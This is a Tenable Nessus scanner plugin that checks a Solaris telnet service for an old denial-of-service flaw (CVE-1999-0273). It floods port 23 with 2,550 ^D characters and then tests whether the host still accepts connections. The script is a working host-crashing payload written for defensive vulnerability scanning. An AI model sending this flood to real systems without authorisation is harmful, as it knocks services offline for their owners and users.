#
# (C) Tenable Network Security, Inc.
#

# "SunKill"

include( 'compat.inc' );

if(description)
{
  script_id(10272);
  script_version ("$Revision: 1.22 $");
  script_cve_id("CVE-1999-0273");
  script_xref(name:"OSVDB", value:"8729");

  script_name(english:"Solaris ^D Character Remote Telnet Service DoS");
  script_summary(english:"Crashes the remote Sun host");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote host is vulnerable to denial of service.'
  );

  script_set_attribute(
    attribute:'description',
    value:'It was possible to make the remote Sun crash by flooding it
with ^D characters instead of entering our login.

This flaw allows an attacker to prevent your network from working properly.'
  );

  script_set_attribute(
    attribute:'solution',
    value:'Upgrade your telnet server and filter the incoming traffic to this port.'
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://archives.neohapsis.com/archives/bugtraq/1997_4/0462.html'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P'
  );

  script_end_attributes();

  script_category(ACT_KILL_HOST);
  script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
  script_family(english:"Denial of Service");
  script_dependencie("find_service1.nasl", "wingate.nasl");
  script_exclude_keys("wingate/enabled");
  script_require_ports(23, "Services/telnet");
  script_require_keys("Settings/ParanoidReport");
  exit(0);
}

#
# The script code starts here
#

# Wingate doesnt establish properly the telnet
# session, so if we know that we are facing it,
# we go away
include("global_settings.inc");
include('telnet_func.inc');
if (report_paranoia < 2) exit(0);

wingate = get_kb_item("wingate/enabled");
if(wingate)exit(0);

port = get_kb_item("Services/telnet");
if(!port)port = 23;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  c = telnet_negotiate(socket:soc);
  d = raw_string(0x04);
  data = crap(length:2550, data:d);
  send(socket:soc, data:data);
  close(soc);
  soc2 = NULL;
  for (i = 0; i < 3 && ! soc2; i ++)
  {
    sleep(i);
    soc2 = open_sock_tcp(port);
  }
  if(!soc2){
  	set_kb_item(name:"Host/dead", value:TRUE);
	security_warning(port);
	}
  else close(soc2);
  }
}
